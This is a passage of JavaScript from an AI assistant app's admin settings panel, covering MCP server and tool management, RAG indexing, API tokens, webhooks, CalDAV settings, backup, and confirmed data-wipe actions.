        const fd = new FormData(); fd.append('is_enabled', btn.dataset.admMcpEnable);
        await fetch(`/api/mcp/servers/${btn.dataset.admMcpToggle}`, { method: 'PATCH', body: fd, credentials: 'same-origin' });
        loadMcpServers();
      });
    });
    list.querySelectorAll('[data-adm-mcp-delete]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Delete this MCP server?', { confirmText: 'Delete', danger: true })) return;
        await fetch(`/api/mcp/servers/${btn.dataset.admMcpDelete}`, { method: 'DELETE', credentials: 'same-origin' });
        loadMcpServers();
      });
    });
    // Tools expand/collapse (click anywhere on card)
    list.querySelectorAll('[data-adm-mcp-id]').forEach(row => {
      const header = row.querySelector('[data-adm-mcp-header]');
      if (!header) return;
      let _toolsLoaded = false;
      row.style.cursor = 'pointer';
      row.addEventListener('click', async (e) => {
        if (e.target.closest('.admin-btn-sm, .admin-btn-delete, a, .mcp-tools-list, .mcp-tools-header')) return;
        const sid = header.dataset.admMcpHeader;
        const panel = row.querySelector(`[data-adm-mcp-tools-panel="${sid}"]`);
        if (!panel) return;
        panel.classList.toggle('hidden');
        const chevron = row.querySelector('.admin-user-chevron');
        const isOpen = !panel.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
        if (!_toolsLoaded && isOpen) {
          _toolsLoaded = true;
          panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">Loading tools...</span>';
          try {
            const res = await fetch(`/api/mcp/servers/${sid}/tools`, { credentials: 'same-origin' });
            const tools = await res.json();
            if (!tools.length) { panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">No tools</span>'; return; }
            const disabled = new Set(tools.filter(t => t.is_disabled).map(t => t.name));
            panel.innerHTML = `<div class="mcp-tools-header">
              <span>Tools</span>
              <span style="display:flex;gap:8px;align-items:center;">
                <span class="mcp-tools-count">${tools.length - disabled.size}/${tools.length} enabled</span>
                <a href="#" data-mcp-select-all="${sid}">All</a>
                <a href="#" data-mcp-select-none="${sid}">None</a>
              </span>
            </div><div class="mcp-tools-list">` + tools.map(t =>
              `<label title="${esc(t.description)}">
                <input type="checkbox" data-mcp-tool-name="${esc(t.name)}" ${!t.is_disabled ? 'checked' : ''}>
                <span><strong>${esc(t.name)}</strong> <span style="opacity:0.5;">— ${esc((t.description || '').slice(0, 80))}</span></span>
              </label>`
            ).join('') + '</div>';
            panel.querySelector(`[data-mcp-select-all="${sid}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('input[type=checkbox]').forEach(cb => cb.checked = true);
              _saveMcpToolState(sid, panel);
            });
            panel.querySelector(`[data-mcp-select-none="${sid}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('input[type=checkbox]').forEach(cb => cb.checked = false);
              _saveMcpToolState(sid, panel);
            });
            panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
              cb.addEventListener('change', () => _saveMcpToolState(sid, panel));
            });
          } catch (e) { panel.innerHTML = '<span class="admin-error" style="font-size:11px;">Failed to load tools</span>'; }
        }
      });
    });
  } catch (e) { if (list) list.innerHTML = '<div class="admin-error">Failed to load MCP servers</div>'; }
}

async function _saveMcpToolState(serverId, panel) {
  const disabled = [];
  panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
    if (!cb.checked) disabled.push(cb.dataset.mcpToolName);
  });
  const total = panel.querySelectorAll('input[type=checkbox]').length;
  try {
    await fetch(`/api/mcp/servers/${serverId}/tools`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ disabled }),
    });
    // Update the count label in the panel
    const countLabel = panel.querySelector('.mcp-tools-count');
    if (countLabel) countLabel.textContent = `${total - disabled.length}/${total} enabled`;
    // Update badge in the server row
    const row = panel.closest('[data-adm-mcp-id]');
    if (row) {
      const badge = row.querySelector('.admin-badge');
      if (badge) badge.textContent = `Connected (${total - disabled.length}/${total} tools enabled)`;
    }
  } catch (e) { /* silent */ }
}

function initMcpForm() {
  const cmdEl = el('adm-mcpCommand');
  if (!cmdEl) return;  // MCP form not present in this build — nothing to wire
  const transportSel = el('adm-mcpTransport');
  const sseRow = el('adm-mcpSseRow');
  const envRow = el('adm-mcpEnvRow');
  const envFieldsWrap = el('adm-mcpEnvFields');
  const helpBox = el('adm-mcpHelp');
  const cmdRow = cmdEl.parentElement;
  let _activeHelp = null;
  let _envKeys = []; // track which env keys have dedicated fields
  let _activeOauthFile = null; // preset oauthFile config (for Google servers)
  let _activeOauth = null;     // preset OAuth flow config (provider, scopes, etc.)

  function _clearEnvFields() {
    envFieldsWrap.innerHTML = '';
    _envKeys = [];
    envRow.style.display = 'none';
    el('adm-mcpEnv').value = '';
    _activeOauth = null;
  }

  function _buildEnvFields(envObj, help, preset) {
    _clearEnvFields();
    const keys = Object.keys(envObj);
    if (!keys.length) return;
    _envKeys = keys;

    // Provider dropdown (e.g. for Email IMAP/SMTP)
    if (preset?.providerDropdown) {
      const pd = preset.providerDropdown;
      const row = document.createElement('div');
      row.className = 'admin-model-form-row';
      row.style.cssText = 'gap:6px;align-items:center;';
      const label = document.createElement('span');
      label.style.cssText = 'font-size:11px;opacity:0.55;min-width:0;white-space:nowrap;';
      label.textContent = pd.label || 'Provider';
      const select = document.createElement('select');
      select.style.cssText = 'flex:1;padding:6px 8px;border-radius:6px;border:1px solid var(--border);background:var(--bg-secondary);color:var(--text-primary);font-size:12px;';
      pd.options.forEach((opt, i) => {
        const o = document.createElement('option');
        o.value = i;
        o.textContent = opt.name;
        select.appendChild(o);
      });
      select.addEventListener('change', () => {
        const opt = pd.options[parseInt(select.value)];
        for (const [envKey, field] of Object.entries(pd.targets)) {
          const inp = envFieldsWrap.querySelector(`.mcp-env-input[data-env-key="${envKey}"]`);
          if (inp) inp.value = opt[field] || '';
        }
      });
      row.appendChild(label);
      row.appendChild(select);
      envFieldsWrap.appendChild(row);
      // Auto-fill with first provider after inputs are created
      setTimeout(() => {
        const first = pd.options[0];
        for (const [envKey, field] of Object.entries(pd.targets)) {
          const inp = envFieldsWrap.querySelector(`.mcp-env-input[data-env-key="${envKey}"]`);
          if (inp && !inp.value) inp.value = first[field] || '';
        }
      }, 0);
    }

    for (const key of keys) {
      const row = document.createElement('div');
      row.className = 'admin-model-form-row';
      row.style.cssText = 'gap:6px;align-items:center;';
      const label = document.createElement('span');
      label.style.cssText = 'font-size:11px;opacity:0.55;min-width:0;white-space:nowrap;';
      label.textContent = key.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
      const input = document.createElement('input');
      input.type = key.toLowerCase().includes('secret') || key.toLowerCase().includes('token') || key.toLowerCase().includes('key') || key.toLowerCase().includes('password') ? 'password' : 'text';
      input.placeholder = key;
      input.dataset.envKey = key;
      input.className = 'mcp-env-input';
      input.style.cssText = 'flex:1;';
      if (envObj[key]) input.value = envObj[key];
      row.appendChild(label);
      row.appendChild(input);
      envFieldsWrap.appendChild(row);
    }
    // Help toggle link
    if (help) {
      _activeHelp = help;
      const helpLink = document.createElement('a');
      helpLink.textContent = 'How do I get these?';
      helpLink.href = '#';
      helpLink.style.cssText = 'font-size:10.5px;opacity:0.5;margin-top:2px;display:inline-block;';
      helpLink.addEventListener('click', (e) => {
        e.preventDefault();
        helpBox.style.display = helpBox.style.display === 'none' ? '' : 'none';
      });
      envFieldsWrap.appendChild(helpLink);
      helpBox.textContent = help;
      helpBox.style.display = 'none';
    } else {
      _activeHelp = null;
      helpBox.style.display = 'none';
    }
  }

  // Collect env from either dedicated fields or raw JSON fallback
  function _collectEnv() {
    if (_envKeys.length) {
      const obj = {};
      envFieldsWrap.querySelectorAll('.mcp-env-input').forEach(inp => {
        if (inp.value.trim()) obj[inp.dataset.envKey] = inp.value.trim();
      });
      return JSON.stringify(obj);
    }
    return el('adm-mcpEnv').value.trim() || '{}';
  }

  transportSel.addEventListener('change', () => {
    const isSse = transportSel.value === 'sse';
    sseRow.style.display = isSse ? '' : 'none';
    cmdRow.style.display = isSse ? 'none' : '';
    if (isSse) { _clearEnvFields(); helpBox.style.display = 'none'; }
  });

  // Preset catalog
  const presetSel = el('adm-mcpPreset');
  if (presetSel) {
    MCP_PRESETS.forEach((p, i) => {
      const opt = document.createElement('option');
      opt.value = i;
      opt.textContent = p.name + (Object.keys(p.env).length ? '  (requires keys)' : '');
      presetSel.appendChild(opt);
    });
    presetSel.addEventListener('change', () => {
      if (presetSel.value === '') return;
      const p = MCP_PRESETS[parseInt(presetSel.value)];
      el('adm-mcpName').value = p.name.toLowerCase().replace(/\s+/g, '-');
      transportSel.value = 'stdio';
      el('adm-mcpCommand').value = p.command;
      el('adm-mcpArgs').value = JSON.stringify(p.args);
      sseRow.style.display = 'none';
      cmdRow.style.display = '';
      _buildEnvFields(p.env, p.help || null, p);
      _activeOauthFile = p.oauthFile || null;
      _activeOauth = p.oauth || null;
      presetSel.value = '';
      // Focus first env field if keys are needed
      const firstInput = envFieldsWrap.querySelector('.mcp-env-input');
      if (firstInput) firstInput.focus();
      else el('adm-mcpAddBtn').focus();
    });
  }

  el('adm-mcpAddBtn').addEventListener('click', async () => {
    const name = el('adm-mcpName').value.trim();
    const transport = transportSel.value;
    const command = el('adm-mcpCommand').value.trim();
    const args = el('adm-mcpArgs').value.trim() || '[]';
    const env = _collectEnv();
    const url = el('adm-mcpUrl').value.trim();
    const msg = el('adm-mcpMsg');
    if (!name) { msg.textContent = 'Name is required'; msg.className = 'admin-error'; return; }
    if (transport === 'stdio' && !command) { msg.textContent = 'Command is required for stdio'; msg.className = 'admin-error'; return; }
    if (transport === 'sse' && !url) { msg.textContent = 'URL is required for SSE'; msg.className = 'admin-error'; return; }
    try { JSON.parse(env); } catch { msg.textContent = 'Env must be valid JSON'; msg.className = 'admin-error'; return; }
    const fd = new FormData();
    fd.append('name', name); fd.append('transport', transport); fd.append('command', command); fd.append('args', args); fd.append('env', env); fd.append('url', url);
    // If preset has oauthFile config, send credentials for file generation
    if (_activeOauthFile) {
      const envObj = JSON.parse(env);
      fd.append('oauth_file', JSON.stringify({
        dir: _activeOauthFile.dir,
        filename: _activeOauthFile.filename,
        client_id: envObj.GOOGLE_CLIENT_ID || '',
        client_secret: envObj.GOOGLE_CLIENT_SECRET || '',
      }));
    }
    // If preset has OAuth flow config, send it so the server can handle authorization
    if (_activeOauth) {
      fd.append('oauth_config', JSON.stringify(_activeOauth));
    }
    msg.textContent = 'Adding...'; msg.className = '';
    try {
      const res = await fetch('/api/mcp/servers', { method: 'POST', body: fd, credentials: 'same-origin' });
      const data = await res.json();
      if (data.needs_oauth) {
        msg.innerHTML = `Added ${esc(name)} — <a href="/api/mcp/oauth/authorize/${data.id}" target="_blank" style="color:var(--red);font-weight:600;">Authorize with Google</a> to connect`;
        msg.className = 'admin-success';
      } else if (data.connected) {
        msg.textContent = `Added ${name} (${data.tool_count} tools discovered)`; msg.className = 'admin-success';
      } else { msg.textContent = `Added but connection failed: ${data.error || 'unknown'}`; msg.className = 'admin-error'; }
      el('adm-mcpName').value = ''; el('adm-mcpCommand').value = ''; el('adm-mcpArgs').value = ''; el('adm-mcpUrl').value = '';
      _clearEnvFields(); helpBox.style.display = 'none'; _activeHelp = null; _activeOauthFile = null; _activeOauth = null;
      loadMcpServers();
    } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
  });
}

/* ── Embedding model ──
   No settings UI: the embedding model (RAG, semantic memory, tool selection)
   is fixed infrastructure that ships with the app, and swapping it would
   invalidate every existing vector. Configure via the FASTEMBED_MODEL /
   EMBEDDING_URL env vars if you really need to override it. */

/* ── RAG ── */
async function loadRag() {
  try {
    const res = await fetch('/api/personal');
    const data = await res.json();
    const dirList = el('adm-ragDirList');
    const dirs = data.directories || [];
    if (dirs.length === 0) { dirList.innerHTML = '<div class="admin-empty">No directories indexed</div>'; }
    else {
      dirList.innerHTML = dirs.map(d => `<div class="admin-rag-item"><span class="admin-rag-item-name" title="${esc(d)}">${esc(d)}</span><button class="admin-btn-delete" data-adm-rag-dir="${esc(d)}">Remove</button></div>`).join('');
      dirList.querySelectorAll('[data-adm-rag-dir]').forEach(btn => {
        btn.addEventListener('click', async () => {
          if (!await uiModule.styledConfirm(`Remove directory "${btn.dataset.admRagDir}" from RAG?`, { confirmText: 'Remove', danger: true })) return;
          btn.disabled = true; btn.textContent = '...';
          try {
            const res = await fetch('/api/personal/remove_directory?directory=' + encodeURIComponent(btn.dataset.admRagDir), { method: 'DELETE' });
            if (res.ok) { ragMsg('Directory removed'); loadRag(); }
            else { const e = await res.json(); ragMsg(e.detail || 'Failed', true); }
          } catch (e) { ragMsg('Error: ' + e.message, true); }
        });
      });
    }
    const fileList = el('adm-ragFileList');
    const files = data.files || [];
    if (files.length === 0) { fileList.innerHTML = '<div class="admin-empty">No files indexed</div>'; }
    else {
      fileList.innerHTML = files.map(f => {
        const size = f.size ? (f.size > 1024 ? (f.size / 1024).toFixed(1) + ' KB' : f.size + ' B') : '';
        return `<div class="admin-rag-item"><span class="admin-rag-item-name" title="${esc(f.path || f.name)}">${esc(f.name)}</span><span class="admin-rag-item-meta">${size}</span><button class="admin-btn-delete" data-adm-rag-file="${esc(f.path || f.name)}">Delete</button></div>`;
      }).join('');
      fileList.querySelectorAll('[data-adm-rag-file]').forEach(btn => {
        btn.addEventListener('click', async () => {
          if (!await uiModule.styledConfirm(`Delete "${btn.dataset.admRagFile}" from RAG?`, { confirmText: 'Delete', danger: true })) return;
          btn.disabled = true; btn.textContent = '...';
          try {
            const res = await fetch('/api/personal/file?filepath=' + encodeURIComponent(btn.dataset.admRagFile), { method: 'DELETE' });
            if (res.ok) { ragMsg('File removed'); loadRag(); }
            else { const e = await res.json(); ragMsg(e.detail || 'Failed', true); }
          } catch (e) { ragMsg('Error: ' + e.message, true); }
        });
      });
    }
  } catch (e) {
    el('adm-ragDirList').innerHTML = '<div class="admin-error">Failed to load</div>';
    el('adm-ragFileList').innerHTML = '';
  }
}

let _ragMsgTimer = null;
function ragMsg(text, isError, persist) {
  const s = el('adm-ragStatus');
  s.textContent = text; s.style.color = isError ? 'var(--red)' : 'var(--fg)';
  if (_ragMsgTimer) { clearTimeout(_ragMsgTimer); _ragMsgTimer = null; }
  if (text && !persist) _ragMsgTimer = setTimeout(() => { s.textContent = ''; }, 5000);
}

async function ragUpload(files) {
  if (!files || files.length === 0) return;
  ragMsg('Uploading ' + files.length + ' file(s)...', false, true);
  const fd = new FormData();
  for (const f of files) fd.append('files', f);
  try {
    const res = await fetch('/api/personal/upload', { method: 'POST', body: fd });
    const data = await res.json();
    if (data.success) { ragMsg(`Uploaded ${data.uploaded.length} file(s), ${data.indexed_count} chunks indexed`); loadRag(); }
    else ragMsg(data.detail || 'Upload failed', true);
  } catch (e) { ragMsg('Upload error: ' + e.message, true); }
}

function initRag() {
  const dropZone = el('adm-ragDropZone');
  const fileInput = el('adm-ragFileInput');
  dropZone.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', () => ragUpload(fileInput.files));
  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('dragover'); });
  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
  dropZone.addEventListener('drop', e => { e.preventDefault(); dropZone.classList.remove('dragover'); ragUpload(e.dataTransfer.files); });
  el('adm-ragAddDirBtn').addEventListener('click', async () => {
    const dir = el('adm-ragDirInput').value.trim();
    if (!dir) return;
    const btn = el('adm-ragAddDirBtn');
    btn.disabled = true; btn.textContent = 'Indexing...';
    try {
      const res = await fetch('/api/personal/add_directory', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ directory: dir }) });
      const data = await res.json();
      if (data.success) { ragMsg(`Indexed ${data.indexed_count} chunks from directory`); el('adm-ragDirInput').value = ''; loadRag(); }
      else ragMsg(data.detail || data.message || 'Failed', true);
    } catch (e) { ragMsg('Error: ' + e.message, true); }
    btn.disabled = false; btn.textContent = 'Add Directory';
  });
  el('adm-ragReloadBtn').addEventListener('click', async () => {
    const btn = el('adm-ragReloadBtn');
    btn.disabled = true; btn.textContent = 'Reloading...';
    try {
      const res = await fetch('/api/personal/reload', { method: 'POST' });
      const data = await res.json();
      ragMsg(`Index reloaded: ${data.count} documents`);
      loadRag();
    } catch (e) { ragMsg('Reload failed: ' + e.message, true); }
    btn.disabled = false; btn.textContent = 'Reload Index';
  });
}

/* ═══════════════════════════════════════════
   SYSTEM TAB — Tokens
   ═══════════════════════════════════════════ */
async function loadTokens() {
  const list = el('adm-tokenList');
  try {
    const res = await fetch('/api/tokens', { credentials: 'same-origin' });
    const tokens = await res.json();
    if (!tokens.length) { list.innerHTML = '<div class="admin-empty">No API tokens</div>'; return; }
    list.innerHTML = tokens.map(t => `
      <div class="admin-user-row">
        <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
          <span class="admin-user-name">${esc(t.name)}</span>
          <span class="admin-badge">${esc(t.token_prefix)}...</span>
          <span class="admin-badge" title="Allowed API scopes">${esc((t.scopes || ['chat']).join(', '))}</span>
          ${t.owner ? `<span style="font-size:0.75rem;opacity:0.5;">Owner: ${esc(t.owner)}</span>` : ''}
          ${t.last_used_at ? `<span style="font-size:0.75rem;opacity:0.5;">Last used: ${new Date(t.last_used_at).toLocaleDateString()}</span>` : '<span style="font-size:0.75rem;opacity:0.4;">Never used</span>'}
        </div>
        <button class="admin-btn-delete" data-adm-del-token="${t.id}">Revoke</button>
      </div>`).join('');
    list.querySelectorAll('[data-adm-del-token]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Revoke this API token? External integrations using it will stop working.', { confirmText: 'Revoke', danger: true })) return;
        await fetch(`/api/tokens/${btn.dataset.admDelToken}`, { method: 'DELETE', credentials: 'same-origin' });
        loadTokens();
      });
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load tokens</div>'; }
}

function initTokenForm() {
  el('adm-tokenAddBtn').addEventListener('click', async () => {
    const msg = el('adm-tokenMsg');
    const reveal = el('adm-tokenReveal');
    msg.textContent = ''; msg.className = ''; reveal.style.display = 'none';
    const name = el('adm-tokenName').value.trim();
    if (!name) { msg.textContent = 'Token name is required'; msg.className = 'admin-error'; return; }
    const fd = new FormData(); fd.append('name', name);
    try {
      const res = await fetch('/api/tokens', { method: 'POST', body: fd, credentials: 'same-origin' });
      const data = await res.json();
      if (res.ok) { el('adm-tokenValue').textContent = data.token; reveal.style.display = ''; el('adm-tokenName').value = ''; loadTokens(); }
      else { msg.textContent = data.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
  });
  el('adm-tokenCopyBtn').addEventListener('click', () => {
    const val = el('adm-tokenValue').textContent;
    navigator.clipboard.writeText(val).then(() => {
      el('adm-tokenCopyBtn').textContent = 'Copied!';
      setTimeout(() => { el('adm-tokenCopyBtn').textContent = 'Copy'; }, 2000);
    });
  });
}

/* ── Webhooks ── */
async function loadWebhooks() {
  const list = el('adm-whList');
  try {
    const res = await fetch('/api/webhooks', { credentials: 'same-origin' });
    const hooks = await res.json();
    if (!hooks.length) { list.innerHTML = '<div class="admin-empty">No webhooks configured</div>'; return; }
    list.innerHTML = hooks.map(w => {
      const events = (w.events || []).map(e => `<span class="admin-badge">${esc(e)}</span>`).join(' ');
      const statusBadge = w.last_status_code
        ? `<span class="admin-badge" style="background:${w.last_status_code < 400 ? 'color-mix(in srgb, var(--fg) 20%, transparent)' : 'color-mix(in srgb, var(--red) 20%, transparent)'};color:${w.last_status_code < 400 ? 'var(--fg)' : 'var(--red)'};">${w.last_status_code}</span>`
        : '';
      const lastTriggered = w.last_triggered_at ? new Date(w.last_triggered_at).toLocaleString() : 'Never';
      const errorText = w.last_error ? `<div style="font-size:0.75rem;color:var(--red);margin-top:0.2rem;">Error: ${esc(w.last_error.substring(0, 80))}</div>` : '';
      return `
        <div class="admin-ep-item" style="flex-wrap:wrap;">
          <div class="admin-ep-info" style="flex:1;min-width:200px;">
            <div class="admin-ep-name">${esc(w.name)} ${w.is_active ? '' : '<span class="admin-badge admin-badge-off">disabled</span>'} ${w.has_secret ? '<span class="admin-badge">signed</span>' : ''}</div>
            <div class="admin-ep-detail">${esc(w.url)}</div>
            <div style="margin-top:0.3rem;">${events}</div>
            <div class="admin-ep-detail">Last: ${lastTriggered} ${statusBadge}</div>
            ${errorText}
          </div>
          <div class="admin-ep-actions">
            <button class="admin-btn-sm" data-adm-wh-test="${w.id}">Test</button>
            <button class="admin-btn-sm" data-adm-wh-toggle="${w.id}">${w.is_active ? 'Disable' : 'Enable'}</button>
            <button class="admin-btn-delete" data-adm-wh-delete="${w.id}">Delete</button>
          </div>
        </div>`;
    }).join('');
    list.querySelectorAll('[data-adm-wh-test]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const msg = el('adm-whMsg'); msg.textContent = 'Sending test...'; msg.className = '';
        try {
          const res = await fetch(`/api/webhooks/${btn.dataset.admWhTest}/test`, { method: 'POST', credentials: 'same-origin' });
          msg.textContent = res.ok ? 'Test sent!' : 'Test failed'; msg.className = res.ok ? 'admin-success' : 'admin-error';
          setTimeout(() => loadWebhooks(), 1000);
        } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
      });
    });
    list.querySelectorAll('[data-adm-wh-toggle]').forEach(btn => {
      btn.addEventListener('click', async () => { await fetch(`/api/webhooks/${btn.dataset.admWhToggle}`, { method: 'PATCH', credentials: 'same-origin' }); loadWebhooks(); });
    });
    list.querySelectorAll('[data-adm-wh-delete]').forEach(btn => {
      btn.addEventListener('click', async () => {
        if (!await uiModule.styledConfirm('Delete this webhook?', { confirmText: 'Delete', danger: true })) return;
        await fetch(`/api/webhooks/${btn.dataset.admWhDelete}`, { method: 'DELETE', credentials: 'same-origin' }); loadWebhooks();
      });
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load webhooks</div>'; }
}

function initWebhookForm() {
  el('adm-whAddBtn').addEventListener('click', async () => {
    const msg = el('adm-whMsg');
    msg.textContent = ''; msg.className = '';
    const name = el('adm-whName').value.trim();
    const url = el('adm-whUrl').value.trim();
    const secret = el('adm-whSecret').value.trim();
    const events = Array.from(modalEl.querySelectorAll('.adm-wh-event:checked')).map(e => e.value).join(',');
    if (!name) { msg.textContent = 'Name is required'; msg.className = 'admin-error'; return; }
    if (!url) { msg.textContent = 'URL is required'; msg.className = 'admin-error'; return; }
    if (!events) { msg.textContent = 'Select at least one event'; msg.className = 'admin-error'; return; }
    const fd = new FormData();
    fd.append('name', name); fd.append('url', url); fd.append('secret', secret); fd.append('events', events);
    try {
      const res = await fetch('/api/webhooks', { method: 'POST', body: fd, credentials: 'same-origin' });
      if (res.ok) { msg.textContent = 'Webhook added'; msg.className = 'admin-success'; el('adm-whName').value = ''; el('adm-whUrl').value = ''; el('adm-whSecret').value = ''; loadWebhooks(); }
      else { const d = await res.json(); msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
  });
}

/* ── Features ── */
const featureLabels = {
  web_search: 'Web Search', deep_research: 'Deep Research',
  memory: 'Memory', document_editor: 'Document Editor', rag: 'RAG Knowledge Base', sensitive_filter: 'Sensitive Info Filter',
  gallery: 'Gallery'
};

async function loadFeatures() {
  const container = el('adm-featureToggles');
  try {
    const res = await fetch('/api/auth/features', { credentials: 'same-origin' });
    const features = await res.json();
    container.innerHTML = Object.entries(featureLabels).map(([key, label]) => `
      <div class="admin-toggle-row" style="padding:0.4rem 0;border-bottom:1px solid var(--border);">
        <div class="admin-toggle-label">${label}</div>
        <label class="admin-switch"><input type="checkbox" data-adm-feature="${key}" ${features[key] ? 'checked' : ''}><span class="admin-slider"></span></label>
      </div>`).join('');
    container.querySelectorAll('input[data-adm-feature]').forEach(toggle => {
      toggle.addEventListener('change', async () => {
        const body = {}; body[toggle.dataset.admFeature] = toggle.checked;
        await fetch('/api/auth/features', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
      });
    });
  } catch (e) { container.innerHTML = '<div class="admin-error">Failed to load features</div>'; }
}

/* ── CalDAV Config ── */
function initCalDAV() {
  const urlIn = el('caldav-url');
  const userIn = el('caldav-user');
  const passIn = el('caldav-pass');
  const saveBtn = el('caldav-save-btn');
  const testBtn = el('caldav-test-btn');
  const status = el('caldav-status');
  if (!urlIn || !saveBtn) return;

  // Load current config
  fetch(`${API_BASE}/api/calendar/config`, { credentials: 'same-origin' })
    .then(r => r.json()).then(d => {
      urlIn.value = d.caldav_url || '';
      userIn.value = d.caldav_username || '';
      passIn.value = d.caldav_password || '';
    }).catch(() => {});

  saveBtn.addEventListener('click', async () => {
    status.textContent = 'Saving...';
    try {
      const res = await fetch(`${API_BASE}/api/calendar/config`, {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caldav_url: urlIn.value, caldav_username: userIn.value, caldav_password: passIn.value }),
      });
      const d = await res.json();
      status.textContent = d.ok ? 'Saved' : 'Error';
      status.style.color = d.ok ? 'var(--green)' : 'var(--red)';
    } catch (e) { status.textContent = 'Error'; status.style.color = 'var(--red)'; }
    setTimeout(() => { status.textContent = ''; status.style.color = ''; }, 3000);
  });

  testBtn.addEventListener('click', async () => {
    status.textContent = 'Testing...';
    try {
      // Save first
      await fetch(`${API_BASE}/api/calendar/config`, {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caldav_url: urlIn.value, caldav_username: userIn.value, caldav_password: passIn.value }),
      });
      const res = await fetch(`${API_BASE}/api/calendar/test`, { method: 'POST', credentials: 'same-origin' });
      const d = await res.json();
      status.textContent = d.ok ? `Connected (${d.calendars} calendars)` : `Failed: ${d.error}`;
      status.style.color = d.ok ? 'var(--green)' : 'var(--red)';
    } catch (e) { status.textContent = 'Error'; status.style.color = 'var(--red)'; }
    setTimeout(() => { status.textContent = ''; status.style.color = ''; }, 5000);
  });
}

/* ── Data Backup (export/import) ── */
function initBackup() {
  el('adm-exportDataBtn').addEventListener('click', async () => {
    const btn = el('adm-exportDataBtn');
    const msg = el('adm-backupMsg');
    btn.disabled = true; btn.textContent = 'Exporting...'; msg.textContent = '';
    try {
      const res = await fetch('/api/export', { credentials: 'same-origin' });
      if (!res.ok) throw new Error('Export failed');
      const blob = await res.blob();
      const disposition = res.headers.get('Content-Disposition') || '';
      const match = disposition.match(/filename=(.+)/);
      const filename = match ? match[1] : 'odysseus_backup.json';
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = filename;
      a.click();
      URL.revokeObjectURL(a.href);
      msg.textContent = 'Export downloaded.'; msg.className = 'admin-success';
    } catch (e) { msg.textContent = 'Export failed: ' + e.message; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Export Data';
  });

  const fileInput = el('adm-importFile');
  el('adm-importDataBtn').addEventListener('click', () => { fileInput.value = ''; fileInput.click(); });
  fileInput.addEventListener('change', async () => {
    const file = fileInput.files[0];
    if (!file) return;
    const msg = el('adm-backupMsg');
    const btn = el('adm-importDataBtn');
    btn.disabled = true; btn.textContent = 'Importing...'; msg.textContent = '';
    try {
      const text = await file.text();
      const data = JSON.parse(text);
      const res = await fetch('/api/import', {
        method: 'POST', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      const result = await res.json();
      if (res.ok && result.ok) {
        msg.textContent = result.message || 'Import successful.'; msg.className = 'admin-success';
      } else {
        msg.textContent = result.message || result.detail || 'Import failed'; msg.className = 'admin-error';
      }
    } catch (e) { msg.textContent = 'Import failed: ' + e.message; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Import Data';
  });
}

/* ── Danger Zone ── */
function initDangerZone() {
  // Per-category Danger Zone wipes. Each button declares its target
  // via data-wipe-kind; one delegated handler handles double-confirm,
  // POSTs to /api/admin/wipe/{kind}, and writes the result.
  const _LABELS = {
    chats: 'chats', memory: 'memory entries', skills: 'skills',
    notes: 'notes', tasks: 'tasks', documents: 'documents',
    gallery: 'gallery images', calendar: 'calendar items',
  };
  const _wipeMsg = el('adm-wipeMsg');
  modalEl.querySelectorAll('[data-wipe-kind]').forEach(btn => {
    btn.addEventListener('click', async () => {
      const kind = btn.dataset.wipeKind;
      const label = _LABELS[kind] || kind;
      if (!await uiModule.styledConfirm(`Wipe ALL ${label}? This cannot be undone.`, { confirmText: 'Wipe', danger: true })) return;
      if (!await uiModule.styledConfirm(`Really wipe every one of your ${label}?`, { confirmText: 'Yes, wipe everything', danger: true })) return;
      btn.disabled = true; const prev = btn.textContent; btn.textContent = 'Wiping…';
      if (_wipeMsg) { _wipeMsg.textContent = ''; _wipeMsg.className = ''; }
      try {
        const res = await fetch(`/api/admin/wipe/${kind}`, { method: 'DELETE', credentials: 'same-origin' });
        const data = await res.json().catch(() => ({}));
        if (res.ok) {
          if (_wipeMsg) { _wipeMsg.textContent = `Wiped ${data.count ?? 0} ${label}.`; _wipeMsg.className = 'admin-success'; }
        } else {
          if (_wipeMsg) { _wipeMsg.textContent = data.detail || 'Failed'; _wipeMsg.className = 'admin-error'; }
        }
      } catch (e) {
        if (_wipeMsg) { _wipeMsg.textContent = 'Request failed: ' + e.message; _wipeMsg.className = 'admin-error'; }
      }
      btn.disabled = false; btn.textContent = prev;
    });
  });
}

/* ═══════════════════════════════════════════
   INIT & REFRESH
   ═══════════════════════════════════════════ */
function initAll() {
  modalEl = el('settings-modal');
